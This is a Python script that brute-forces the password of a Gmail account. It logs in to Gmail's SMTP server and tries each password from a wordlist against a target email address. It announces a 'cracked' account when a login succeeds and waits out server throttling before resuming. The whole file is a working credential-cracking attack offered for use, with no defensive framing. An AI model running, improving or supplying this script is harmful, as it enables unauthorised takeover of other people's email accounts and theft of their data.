#!/usr/bin/env python
# -*- coding: UTF-8 -*-
import smtplib
import time
from lib.showthing import  *
from lib.command import *
import codecs

server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
server.ehlo()

def login(email, password):
    global server
    user_name = email
    printGreen('[!]trying: ' + password)
    try:
        server.login(user_name, password)
        SysCleanScreen()
        InFo()
        printGreen ('[+]Accounthas been cracked!')
        ShowSucess(email, password)
        return 1;
    except smtplib.SMTPAuthenticationError as e:
        error = str(e)
        if error[14] == '<':
            SysCleanScreen()
            InFo()
            printGreen ('[+]Accounthas been cracked!')
            ShowSucess(email, password)
            return 1;
        else:
            printYellow('[W]Faild\n')
            return 0;
    except smtplib.SMTPServerDisconnected:
        print('[!]Tool is waiting for server...')
        server.close()
        time.sleep(60)
        server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
        server.ehlo()
        login(user_name, password)

class CGmail(object):
    def __init__(self,email,wordlist):
        self.email = email
        self.wordlist = wordlist

        try:
            fp = codecs.open(self.wordlist, "r", encoding='utf-8-sig')
            line = fp.readline()
            while line:
                try:
                    line.strip()
                    if login(self.email, line) == 1:
                        fp.close()
                        exit()
                        break
                    else:
                        line = fp.readline()
                except UnicodeDecodeError:
                    fp.seek(fp.tell()+1)
                    continue

            SysCleanScreen()
            InFo()
            printRed('Sorry~Looks like this wordlist file didn\'t include correct password.\n\nDon\'t forget to thank LBT ^_^')
            fp.close()
        except IOError:
            printRed('\nCan\'t open file:Nu such file:\n'+wordlist)
        #except:
            #printRed('Unknow Error')
            #sys.exc_info()
        finally:
            print ('\n\nbye~')

